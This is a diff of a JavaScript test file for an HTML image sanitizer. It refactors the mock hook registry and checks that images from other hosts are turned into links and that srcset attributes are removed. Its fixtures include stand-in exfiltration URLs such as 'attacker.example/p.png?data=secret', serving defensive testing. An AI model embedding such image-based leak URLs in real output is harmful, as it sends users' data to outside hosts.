@@ -121,17 +121,17 @@ test('sanitize replaces a raw <img> from another host with a link, and keeps an 
         }
     };
     const images = loadImages({ document });
-    let hook = null;
+    const hooks = {};
     const purify = {
         addHook(name, callback) {
-            assert.strictEqual(name, 'afterSanitizeAttributes');
-            hook = callback;
+            hooks[name] = callback;
         },
         removeHook(name) {
-            assert.strictEqual(name, 'afterSanitizeAttributes');
-            hook = null;
+            delete hooks[name];
         },
         sanitize(html) {
+            const hook = hooks.afterSanitizeAttributes;
+
             const outside = imageNode('https://attacker.example/p.png?data=secret', 'alt text');
             const inside = imageNode('https://chat.example.test/ok.png', 'ok');
 
@@ -151,16 +151,17 @@ test('sanitize replaces a raw <img> from another host with a link, and keeps an 
     const result = images.sanitize(purify, '<img>', { ADD_TAGS: ['canvas'] }, { allowedHosts: [], baseUrl: BASE });
 
     assert.strictEqual(result, '<sanitized><img>');
-    assert.strictEqual(hook, null, 'the hook stayed registered and would apply to every later sanitize call');
+    assert.deepStrictEqual(Object.keys(hooks), [], 'a hook stayed registered and would apply to every later sanitize call');
 });
 
 test('sanitize removes srcset, which could load a second address, from an image that stays', () => {
     const images = loadImages({ document: { createElement: () => ({ setAttribute() { } }) } });
-    let hook = null;
+    const hooks = {};
     const purify = {
-        addHook(_name, callback) { hook = callback; },
-        removeHook() { hook = null; },
+        addHook(name, callback) { hooks[name] = callback; },
+        removeHook(name) { delete hooks[name]; },
         sanitize() {
+            const hook = hooks.afterSanitizeAttributes;
             const node = imageNode('https://chat.example.test/ok.png', 'ok');
 
             node.attributes.srcset = 'https://attacker.example/p.png 2x';
